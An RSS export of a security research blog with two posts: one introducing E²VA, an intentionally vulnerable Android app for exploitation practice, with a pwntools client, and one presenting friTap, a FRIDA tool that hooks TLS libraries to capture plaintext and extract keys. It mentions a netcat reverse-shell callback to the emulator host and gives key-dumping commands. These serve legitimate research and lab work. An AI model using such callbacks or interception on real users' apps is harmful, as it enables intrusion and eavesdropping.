<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>lolcads tech blog</title><link>https://lolcads.github.io/</link><description>Recent content on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Mon, 21 Nov 2022 18:54:42 +0100</lastBuildDate><atom:link href="https://lolcads.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Diving into the art of userspace exploitation under Android - Introducing E²VA</title><link>https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/</link><pubDate>Mon, 21 Nov 2022 18:54:42 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/</guid><description>Investigating Binary Exploitation for JNI on Android This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the damnvulnerableapp supports the process of binary exploitation on Android.
Warning The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app.</description><content>&lt;h1 id="investigating-binary-exploitation-for-jni-on-android">Investigating Binary Exploitation for JNI on Android&lt;/h1>
&lt;p>This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the &lt;em>damnvulnerableapp&lt;/em> supports the process of binary exploitation on Android.&lt;/p>
&lt;h2 id="warning">Warning&lt;/h2>
&lt;p>The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app. Therefore, beware of this and do not use this app on a device/emulator that contains personal information whatsoever. Always launch the app in a controlled environment. &lt;strong>No authentication&lt;/strong> is necessary to connect to the app and talk to vulnerable modules. Assuming the app is free of bugs, there is a guarantee that only one client can connect at a time.&lt;/p>
&lt;h2 id="esup2supva-the-damnvulnerableapp">&lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em>, the &lt;em>damnvulnerableapp&lt;/em>&lt;/h2>
&lt;p>In order to properly investigate binary exploitation on Android, an app has been written that allows for running custom vulnerable modules, i.e. Java classes with one entry point, in a separate process. It is remotely controllable and constructed in a way that allows to (re-)run a module multiple times even when it crashed.&lt;/p>
&lt;p>The app is named &lt;strong>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/strong>, i.e. &lt;em>Exploitation Experience (with) Vulnerable App&lt;/em>. Within this blog series, &lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em> and &lt;em>damnvulnerableapp&lt;/em> will be used interchangably, so do not get confused!&lt;/p>
&lt;p>The core of the &lt;em>damnvulnerableapp&lt;/em> is a background service, called &lt;em>manager&lt;/em>, that handles communication with external users (only one at a time) and translates the messages received into actions to perform. Among other things, the most important actions are:&lt;/p>
&lt;ol>
&lt;li>Selecting a vulnerable module to be run in a &lt;strong>separate process&lt;/strong>. This has to be done, because it is &lt;strong>very&lt;/strong> likely that the vulnerable module will crash in case we mess up with an exploit.&lt;/li>
&lt;li>Exiting a vulnerable module. This will shutdown the process that hosts the vulnerable module and revert back to a selection state.&lt;/li>
&lt;li>Forwarding messages to the vulnerable module. It is possible to forward arbitrary binary data. Of course it is up to the module to accept this or not. E.g. if a vulnerable module internally calls &lt;code>strcpy&lt;/code>, sending arbitrary binary data will probably not do the trick.&lt;/li>
&lt;li>Fetching messages from the vulnerable module. When sending a fetch request, the &lt;em>manager&lt;/em> will try to read data from the vulnerable module. Depending on the configurations, this can time out or block forever.&lt;/li>
&lt;/ol>
&lt;p>Therefore, the usual steps are:&lt;/p>
&lt;ol>
&lt;li>Select a module&lt;/li>
&lt;li>Forward and fetch data until done, i.e. either until the process crashes or exits by itself or is instructed by an external user to terminate.&lt;/li>
&lt;li>Optionally, when trying to terminate the hosting process, &lt;em>manager&lt;/em> can be instructed to do so.&lt;/li>
&lt;/ol>
&lt;p>As regards selecting a module, the following diagram tries to illustrate this process:
&lt;img src="https://lolcads.github.io/2022/11/RequestExample_2.png" alt="Selecting a module">&lt;/p>
&lt;p>Notice that the &lt;em>Zygote&lt;/em> process is responsible for creating a new activity by forking. Therefore, the vulnerable process will contain e.g. the same canary as the manager app, which was also forked from &lt;em>Zygote&lt;/em>.&lt;/p>
&lt;p>In addition to selecting a module, the next diagram describes how data is fetched from a module and sent to an external user:
&lt;img src="https://lolcads.github.io/2022/11/RequestExample_3.png" alt="Forwarding message to a module">&lt;/p>
&lt;p>If a vulnerable module crashes, e.g. due to a failed exploitation attempt, then the &lt;em>manager&lt;/em> will detect this and revert back to the selection state. Therefore, one may select a new module immediately after the old module crashed. It is advised to &lt;strong>not&lt;/strong> flood &lt;em>manager&lt;/em> with commands as it takes time to spawn a process or detect that a process died. The latter heavily depends on the configurations and the module&amp;rsquo;s content.&lt;/p>
&lt;p>Also, the app requires specific privileges in order to avoid being rendered irresponsive after some time (often after 10s). To that end the app requests &lt;a href="https://developer.android.com/reference/android/provider/Settings#ACTION_MANAGE_OVERLAY_PERMISSION">&lt;code>ACTION_MANAGE_OVERLAY_PERMISSION&lt;/code>&lt;/a> (which is a runtime permission that can be dangerous, so please run the app on a device/emulator that does not contain personal information whatsoever, just in case &lt;em>damnvulnerableapp&lt;/em> gets hijacked by someone other than you). This permission seems to keep the &lt;em>manager&lt;/em> alive.&lt;/p>
&lt;h3 id="architecture">Architecture&lt;/h3>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> is tested on an x86_64 Pixel 3 emulator that runs Android 12.0.0. The build number is &lt;a href="https://source.android.com/docs/setup/about/build-numbers#build-ids-defined">&lt;code>SE1A.220203.002.A1&lt;/code>&lt;/a>. Therefore, all exploits that involve shellcode will contain x86_64 assembly.&lt;/p>
&lt;h3 id="running-vulnerable-modules">Running Vulnerable Modules&lt;/h3>
&lt;p>Assuming there is a vulnerable module to be run, the &lt;em>manager&lt;/em> can be started from &lt;a href="https://developer.android.com/studio">&lt;em>Android Studio&lt;/em>&lt;/a> or via &lt;a href="https://developer.android.com/studio/command-line/adb">&lt;code>adb&lt;/code>&lt;/a>. Also &lt;em>damnvulnerableapp&lt;/em> should be launched in debug mode. Technically speaking, there is no need to start the app from &lt;em>Android Studio&lt;/em> other than being able to attach &lt;em>lldb&lt;/em> to the vulnerable module, as well as to adjust configurations to avoid timeouts etc. In order to get to more realistic binary exploitation, one should start with the &lt;code>.apk&lt;/code> file, start the app from console and go from there.&lt;/p>
&lt;p>Another thing to consider is that one should &lt;strong>not&lt;/strong> try to call e.g. &lt;code>execve&lt;/code> in the vulnerable process. This comes from the fact that e.g. &lt;code>execve&lt;/code> will &amp;ldquo;destroy&amp;rdquo; the actual vulnerable process, thus shutting down the connection to &lt;em>manager&lt;/em>. As &lt;em>manager&lt;/em> will assume the process to be dead, because the connection broke, it will attempt to fully kill remnants of the vulnerable process and then revert back to a select state. Thus, calling e.g. &lt;code>execve&lt;/code> dooms the vulnerabe process to be destroyed by &lt;em>manager&lt;/em>. One may think of this as an additional security mechanism, or just a reminder that stealthy exploits are cooler than loud one - shot exploits.&lt;/p>
&lt;h4 id="types-of-vulnerable-modules">Types of vulnerable modules&lt;/h4>
&lt;p>In order to allow for as many perspectives as possible for binary exploitation on Android, each vulnerable module encapsulates one of the following:&lt;/p>
&lt;ol>
&lt;li>a completely different vulnerability class than all the other modules. E.g. &lt;em>buffer - overflow&lt;/em> vs. &lt;em>use - after - free&lt;/em>.&lt;/li>
&lt;li>a slightly modified version of a fixed vulnerability class. E.g. a &lt;em>use - after - free&lt;/em> vulnerability can result in a &lt;em>Write - What - Where&lt;/em> condition or in an attacker being able to execute a chosen function, depending on the implementation.&lt;/li>
&lt;/ol>
&lt;p>Consider the composition of a vulnerable module:
&lt;img src="https://lolcads.github.io/2022/11/Composition.png" alt="Composition of vulnerable modules">&lt;/p>
&lt;p>As can be seen in the above diagram, every (currently) every module uses JNI functions to introduce vulnerabilities to be exploited. This is where binary exploitation becomes applicable to Java, namely due to native function calls.&lt;/p>
&lt;h4 id="communication-with-vulnerable-modules">Communication with vulnerable modules&lt;/h4>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> will listen for incoming connections on port &lt;code>8080&lt;/code>. If it is run on an emulator, an external user may connect through &lt;code>nc 127.0.0.1 8080&lt;/code>. Before this is possible, one needs to run&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb forward tcp:8080 tcp:8080
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Otherwise, establishing a connection is refused. When trying to create a callback (or reverse shell etc.) in an emulator, i.e. establishing a connection from the emulator to the host, use &lt;code>nc 10.0.2.2 &amp;lt;port&amp;gt;&lt;/code>. According to &lt;a href="https://developer.android.com/studio/run/emulator-networking">docs&lt;/a>, &lt;code>10.0.2.2&lt;/code> is a &amp;ldquo;special alias to your host loopback interface&amp;rdquo;.&lt;/p>
&lt;p>The &lt;em>manager&lt;/em> will only react to messages from an external user, i.e. it uses a &lt;em>request - response&lt;/em> model to handle communication. Therefore, an external agent must not assume that it will be informed if the vulnerable module has a non - empty output queue. An external user always has to explicitly ask the &lt;em>manager&lt;/em> to fetch available output data.&lt;/p>
&lt;p>In order to ease communication with the &lt;em>damnvulnerableapp&lt;/em> and therefore the vulnerable modules, a client emerged that wraps the most important functionalities required to interact with the modules. The client is based on &lt;a href="https://docs.pwntools.com/en/stable/">&lt;code>pwntools&lt;/code>&lt;/a>, but can easily be translated to work with plain &lt;a href="https://docs.python.org/3/library/socket.html">&lt;code>sockets&lt;/code>&lt;/a> aswell.&lt;/p>
&lt;p>The following is the implementation of the &lt;code>pwntools&lt;/code> - based client (no guarantees for correctness and completeness):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> typing &lt;span style="color:#f92672">import&lt;/span> Tuple
TIMEOUT &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">PwnClient&lt;/span>:
&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, host : str, port : int):
self&lt;span style="color:#f92672">.&lt;/span>io &lt;span style="color:#f92672">=&lt;/span> remote(host, port)
self&lt;span style="color:#f92672">.&lt;/span>handshake()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">handshake&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;USER&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;INIT&amp;#39;&lt;/span>, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;INIT&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>receive()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">close&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;SHUTDOWN&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>receive()
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ACK&amp;#39;&lt;/span>)
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>(self, message : bytes, operation, capsule_type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CONTENT&amp;#39;&lt;/span>) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
capsule &lt;span style="color:#f92672">=&lt;/span> capsule_type &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> operation &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; CONTENT &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> message
length &lt;span style="color:#f92672">=&lt;/span> len(capsule)
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>send(p32(length, endian&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;big&amp;#39;&lt;/span>))
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>send(capsule)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">block_receive&lt;/span>(self, num_bytes : int) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> bytes:
message &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> (len(message) &lt;span style="color:#f92672">&amp;lt;&lt;/span> num_bytes):
received &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">1&lt;/span>, timeout&lt;span style="color:#f92672">=&lt;/span>TIMEOUT)
&lt;span style="color:#66d9ef">if&lt;/span> (received &lt;span style="color:#f92672">and&lt;/span> len(received) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>):
message &lt;span style="color:#f92672">+=&lt;/span> received
&lt;span style="color:#66d9ef">return&lt;/span> message
&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74"> Returns:
&lt;/span>&lt;span style="color:#e6db74"> (length, capsule_type, operation, content)
&lt;/span>&lt;span style="color:#e6db74"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">receive&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> Tuple[int, bytes, bytes, bytes]:
length &lt;span style="color:#f92672">=&lt;/span> u32(self&lt;span style="color:#f92672">.&lt;/span>block_receive(&lt;span style="color:#ae81ff">4&lt;/span>), endian&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;big&amp;#39;&lt;/span>)
message &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>block_receive(length)
split_message &lt;span style="color:#f92672">=&lt;/span> message&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)
operation &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (len(split_message) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>):
operation &lt;span style="color:#f92672">=&lt;/span> split_message[&lt;span style="color:#ae81ff">1&lt;/span>]
content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> (len(split_message) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>):
content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(split_message[&lt;span style="color:#ae81ff">3&lt;/span>:])
&lt;span style="color:#66d9ef">return&lt;/span> (length, split_message[&lt;span style="color:#ae81ff">0&lt;/span>], operation, content)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">select&lt;/span>(self, module_name : str) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(module_name&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>), &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;SELECT&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">forward&lt;/span>(self, message : bytes) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(message, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FORWARD&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> bytes:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FETCH&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">exit&lt;/span>(self) &lt;span style="color:#f92672">-&amp;gt;&lt;/span> str:
self&lt;span style="color:#f92672">.&lt;/span>send(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;EXIT&amp;#39;&lt;/span>)
res &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>receive()[&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode()
self&lt;span style="color:#f92672">.&lt;/span>io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/code>&lt;/pre>&lt;/div>&lt;p>A sample program could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">...&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
io &lt;span style="color:#f92672">=&lt;/span> PwnClient(&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">8080&lt;/span>)
print(io&lt;span style="color:#f92672">.&lt;/span>fetch())
io&lt;span style="color:#f92672">.&lt;/span>forward(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;test123&amp;#39;&lt;/span>)
print(io&lt;span style="color:#f92672">.&lt;/span>fetch())
io&lt;span style="color:#f92672">.&lt;/span>exit()
&lt;span style="color:#66d9ef">if&lt;/span> (__name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>):
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>In this post, &lt;em>damnvulnerableapp&lt;/em> aka &lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em> was presented as an Android app that manages custom vulnerable modules that can be used for vulnerability research on Android OS&amp;rsquo;s. To that end, the modules try to cover different vulnerability classes to allow for discovery of Android - specific difficulities in binary exploitation.
In our next post we dive into the first vulnerability and how to exploit it. Stay tuned.&lt;/p>
&lt;h2 id="getting-started">Getting started&lt;/h2>
&lt;p>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA can be downloaded here: &lt;a href="https://github.com/fkie-cad/eeva">https://github.com/fkie-cad/eeva&lt;/a>&lt;/p></content></item><item><title>friTap - Decrypting TLS on the fly</title><link>https://lolcads.github.io/posts/2022/08/fritap/</link><pubDate>Fri, 12 Aug 2022 13:09:24 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/08/fritap/</guid><description>Encryption - a curse and a blessing at the same time Digital communication in today&amp;rsquo;s world has a particularly high status in our society. Financial transactions are conducted via online banking, private communication is increasingly limited to digital messenger services, and even health data is experiencing a shift to digital form. Due to the growth of such sensitive digital data, the need for secure transmission of such data has become increasingly important over the past decades.</description><content>&lt;h2 id="encryption---a-curse-and-a-blessing-at-the-same-time">Encryption - a curse and a blessing at the same time&lt;/h2>
&lt;p>Digital communication in today&amp;rsquo;s world has a particularly high status in our society. Financial transactions are conducted via online banking, private communication is increasingly limited to digital messenger services, and even health data is experiencing a shift to digital form. Due to the growth of such sensitive digital data, the need for secure transmission of such data has become increasingly important over the past decades. With the introduction of high-performance and digitally secure cryptographic methods, such as SSL/TLS, today&amp;rsquo;s digital communications are predominantly encrypted. Whereas back then, for example, an attacker could hang himself between the client and the server and read the data traffic without encryption, today all he sees is a jumble of letters.
Encryption is truly a boon for protecting sensitive personal data, but it also has its drawbacks, as with almost everything. Encrypted communications negate the ability to analyze communications, which is very relevant when reverse engineering malware or researching vulnerabilities.&lt;/p>
&lt;h2 id="man-in-the-middle-proxy-as-a-solution">Man-in-the-middle proxy as a solution&lt;/h2>
&lt;p>One of the best known solutions to intercept and decrypt encrypted communications is the so-called &amp;ldquo;man-in-the-middle&amp;rdquo; attack. In this case, the attacker or analyst pretends to be a trustworthy communication partner to the client. However, since the client often does not know how the client&amp;rsquo;s communication partner, referred to hereafter as the server, communicates or behaves, the attacker (or analyst) forwards the communication to the server and pretends to be the client.
To establish encrypted communication via TLS, for example, a certificate is required, which the server sends to the client when the connection is established. So a connection is established between the MitM proxy and the client using a MitM certificate (fake certificate) and a connection is established between the MitM proxy and the server using a server certificate.
&lt;img src="https://lolcads.github.io/2022/08/mitm_proxy_without_cert_pinning.svg" alt="MitM">&lt;/p>
&lt;p>Due to this setup, the communication between client and server is routed through the MitM proxy and can be processed on it without encryption.&lt;/p>
&lt;p>There are some preventive measures that can prevent such an attack, especially on mobile devices. One of the best known measures is the so-called &amp;ldquo;certificate pinning&amp;rdquo;. This involves storing the expected server certificate or a hash of the certificate in the binary of the client itself. If the client subsequently receives a certificate from the alleged server, this is compared with the embedded certificate or verified by means of a hash value. If this verification is not successful, then the connection is aborted.&lt;/p>
&lt;p>A possible solution to this problem would be to modify the pinning code itself:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/certpinning_hooking.svg" alt="Pinning">&lt;/p>
&lt;p>This approach is possible, but in many cases it is very time-consuming, since the implementations of the pinning can differ greatly depending on the version and the analysis of the code must be performed again for each new version if the pinning is not used from a well known library. In addition, there are, especially with malware, several different implementations of pinning, which is why a general approach often does not lead to the goal.&lt;/p>
&lt;h2 id="our-approach">Our approach:&lt;/h2>
&lt;p>One thing is certain: in order to get the unencrypted communication, the client application must be &amp;ldquo;attacked&amp;rdquo;. This led us to ask why we don&amp;rsquo;t directly extract the decrypted SSL/TLS stream or the key material from the target appliaction.&lt;/p>
&lt;h3 id="abstraction-of-using-a-library">Abstraction of using a library&lt;/h3>
&lt;p>Most applications that perform encrypted communication use a widely available library to do so, such as OpenSSL and NSS. These libraries try to keep the encryption of the data as abstract as possible, so that the use of the library is very convenient. Among other things, they encapsulate the TLS handshake and the sending and receiving of encrypted data.&lt;/p>
&lt;p>A common program flow utilizing a TLS library looks like this:&lt;/p>
&lt;p>The application wants to establish a secure TLS connection to a server. It uses the TLS library for this purpose, which performs the handshake as shown below:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/connection.gif" alt="GIF here">&lt;/p>
&lt;p>After establishing the TLS connection, data can now be sent and received using the read and write functions of the TLS library as shown in the figure below.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/fritap_approach.svg" alt="TLS hooking">&lt;/p>
&lt;p>Exactly these TLS-read and TLS-write functions are used by the target application to read and write the plaintext from TLS stream, respectively.
Hence our tool, &lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a>, is hooking them in order to receive the plaintext of the encrypted packets. Beside this friTap is also able to extract the used TLS keys.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/hooking_Fritap.svg" alt="friTap">&lt;/p>
&lt;h3 id="fritap-usage">friTap usage&lt;/h3>
&lt;p>&lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a> comes with two operation modes. One is to get the plaintext from the TLS payload as PCAP and the other is to get the used TLS keys.
In order to get the decrypted TLS payload we need the &lt;code>-p&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./friTap.py –m –p decryptedTLS.pcap &amp;lt;target_app&amp;gt;
…
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> BoringSSL.so found &amp;amp; will be hooked on Android!
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Android dynamic loader hooked.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Logging pcap to decryptedTLS.pcap
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>-m&lt;/code> paramter indicates that we are analysing a mobile application in the above example. For extracting the TLS keys from a target application we need the &lt;code>-k&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./friTap.py –m –k TLS_keys.log &amp;lt;target_app&amp;gt;
…
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> BoringSSL.so found &amp;amp; will be hooked on Android!
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Android dynamic loader hooked.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Logging keylog file to TLS_keys.log
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As a result friTap writes all TLS keys to the &lt;code>TLS_keys.log&lt;/code> file using the &lt;a href="https://firefox-source-docs.mozilla.org/security/nss/legacy/key_log_format/index.html">NSS Key Log Format&lt;/a>.&lt;/p>
&lt;h2 id="fritap-internals">friTap internals&lt;/h2>
&lt;p>After understanding the overall approach lets dive into the internals of &lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a>.&lt;/p>
&lt;h3 id="frida">FRIDA&lt;/h3>
&lt;p>&lt;a href="https://github.com/fkie-cad/friTap">friTap&lt;/a> is built on the dynamic instrumentation toolkit &lt;a href="https://frida.re/">FRIDA&lt;/a>, which allows developers, reverse engineers and security researchers to dynamically analyze and instrument programs. FRIDA allows you to execute Javascript code within the target program, which gives you the ability to hook functions, read and write program memory, execute custom code, and more. A Python API is provided for using FRIDA, which makes it very user-friendly.&lt;/p>
&lt;p>To accomplish this, FRIDA injects the &lt;a href="https://bellard.org/quickjs/">QuickJS Javascript engine&lt;/a> (can also be changed to the &lt;a href="https://v8.dev/">V8 runtime&lt;/a>) into the target process and an agent that acts as communication interfaces between the instrumentarized process and its own tool later on.
After injection of the engine and the agent, the user is able to execute own Javascript code inside the target process and receive data from it. More on the inner workings of FRIDA can be found &lt;a href="https://frida.re/docs/presentations/">here&lt;/a>.&lt;/p>
&lt;h3 id="program-flow">Program flow&lt;/h3>
&lt;p>A rough overview of the flow of friTap can be seen in the following diagrams, which are explained in more detail in the sections that follow.
The first step after loading the friTap JS script into the target process is to identify the operating system (os) of the target process:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/08/fritap_choose_os_agent_final.svg" alt="">&lt;/p>
